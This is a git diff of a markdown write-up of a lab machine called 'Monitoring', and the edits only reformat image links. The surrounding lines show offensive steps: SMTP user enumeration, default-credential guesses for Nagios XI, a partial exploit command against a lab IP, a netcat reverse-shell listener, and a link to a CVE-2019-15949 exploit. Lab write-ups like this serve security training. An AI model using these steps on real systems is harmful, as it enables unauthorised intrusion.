@@ -37,7 +37,7 @@ VRFY root
 - We confirm the existence of an user called root
 ### Web Enumeration
 #### Port 80
-![[00-Assets/01-Monitoring-3.png]]
+![01-Monitoring-3](00-Assets/01-Monitoring-3.png)
 We can search for default credentials and we found that the admin user is called "nagiosadmin" but the password is stablished while installing the service, then we can try some common passwords:
 ```shell
 nagiosadmin:nagiosadmin
@@ -55,7 +55,7 @@ nagiosadmin:admin
 
 nagios XI 5.6.0
 ```
-![[00-Assets/01-Monitoring.png]]
+![01-Monitoring](00-Assets/01-Monitoring.png)
 - We could log in and we found the version of the Nagios service
 
 ## Foothold
@@ -82,8 +82,7 @@ php nagios_exp.php --host=192.168.196.136 --ssl=false --user=nagiosadmin --pass=
 nc -lnvp 8001
 ```
 
-![[00-Assets/01-Monitoring-4.png]]
-
+![01-Monitoring-4](00-Assets/01-Monitoring-4.png)
 
 ### CVE-2019-15949 - python
 - https://github.com/hadrian3689/nagiosxi_5.6.6
